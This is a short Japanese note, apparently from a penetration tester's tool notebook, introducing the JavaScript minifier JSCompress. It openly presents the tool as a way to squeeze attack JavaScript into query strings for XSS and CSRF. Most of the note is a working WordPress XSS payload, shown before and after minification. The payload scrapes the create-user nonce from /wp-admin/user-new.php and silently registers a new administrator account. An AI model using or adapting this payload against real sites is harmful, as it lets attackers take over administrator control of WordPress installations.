# JSCompress
[公式ページ](https://jscompress.com/)

## 概要
JavaScriptのコードをワンライナーに変換してくれる。
これによってコードサイズを縮小でき、XSSやCSRFを使った攻撃をするときにクエリストリング内にJSのコードを埋め込むといったことができるようになる。

使い方は簡単で、ローカルで書いたJSのコードを貼り付け、JS Compressをクリック、そして出力されたコードをローカルに落とすだけ。

縮小前
```.js
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=hoge&email=hoge@offsec.com&pass1=hoge&pass2=hoge&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```

縮小後
```.js
var ajaxRequest=new XMLHttpRequest,requestURL="/wp-admin/user-new.php",nonceRegex=/ser" value="([^"]*?)"/g;ajaxRequest.open("GET",requestURL,!1),ajaxRequest.send();var nonceMatch=nonceRegex.exec(ajaxRequest.responseText),nonce=nonceMatch[1],params="action=createuser&_wpnonce_create-user="+nonce+"&user_login=hoge&email=hoge@offsec.com&pass1=hoge&pass2=hoge&role=administrator";(ajaxRequest=new XMLHttpRequest).open("POST",requestURL,!0),ajaxRequest.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),ajaxRequest.send(params);
```